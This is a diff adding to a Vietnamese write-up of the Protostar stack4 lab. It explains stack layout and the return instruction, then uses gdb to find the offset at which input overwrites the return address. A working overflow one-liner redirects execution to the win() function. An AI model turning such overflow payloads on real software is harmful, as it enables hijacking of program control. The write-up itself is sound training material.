@@ -44,7 +44,7 @@ Trước đó chúng ta sẽ xem lại cấu trúc Stack memory và code Assembl
 ```
   |  high memory adddress
   | |====================| 
-  | |   name-parameter   |  ^
+  | |   name-arguments   |  ^
   | |====================|  | buffer
   S |   return address   |  | fill
   t |====================|  | direction
@@ -58,6 +58,7 @@ Trước đó chúng ta sẽ xem lại cấu trúc Stack memory và code Assembl
   | |....................|
       low memory address
 ```
+Code Assembly:
 
 ```Asm
 root@protostar:/opt/protostar/bin# gdb -q ./stack4                                                      
@@ -78,7 +79,46 @@ End of assembler dump.
 (gdb) 
 ```
 
+Khi một hàm được gọi nó sẽ lưu trên stack địa chỉ trả về của hàm `(return address)` sau đó là đến EBP `(base pointer)` - tương ứng với 3 dòng đầu của code asm (phần prolog), rồi tiếp theo là các hoạt động khác như biến, giá trị tham chiếu đến hay là tiếp tục gọi đến các hàm con khác.
 
+Khi thực thi xong mã trong hàm, cuối mỗi hàm là câu lệnh `ret` nó sẽ nhảy đến giá trị địa chỉ ở đỉnh stack - sau khi thực thi xong mã tại đó là return address và chuyển flow chương trình về địa chỉ đó. Cụ thể hơn là nó gán giá trị của `EIP` (Extended instruction pointer) = return address.
+
+Nghĩa là nếu ta dùng hàm gets nhập một lượng đủ lớn ký tự input ta có thể overwrite Return address và điều khiển flow chương trình thông qua giá trị ghi đè.
+
+Vậy bao nhiêu là đủ lớn ???
+
+Chúng ta sẽ thử đầu vào (ít nhất nó cũng phải vượt qua khả năng chứa của `buffer`) và debug trong gdb như sau:
+
+```
+root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4' > txt                                         
+root@protostar:/opt/protostar/bin# gdb -q ./stack4                                                      
+Reading symbols from /opt/protostar/bin/stack4...done.                                                  
+(gdb) set disassembly-flavor intel                                                                      
+(gdb) r < txt                                                                                           
+Starting program: /opt/protostar/bin/stack4 < txt                                                                                                                                                               
+Program received signal SIGSEGV, Segmentation fault.                                                    
+0x45454545 in ?? ()        <--- EEEE                                                                                   
+(gdb) 
+```
+
+Như ta thấy chương trình nhảy về địa chỉ 0x45454545 (EEEE) báo lỗi nghĩa là tôi đã ghi đè lên EIP bằng một giá trị 0x45454545.
+
+Bây giờ ta tiến hành tìm địa chỉ hàm win
+
+```
+(gdb) p win
+$1 = {void (void)} 0x80483f4 <win>
+(gdb)
+```
+
+Bước khai thác cuối cùng
+
+```
+root@protostar:/opt/protostar/bin# python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' | ./stack4
+code flow successfully changed
+Segmentation fault
+root@protostar:/opt/protostar/bin#
+```
 
 ## Documents
 
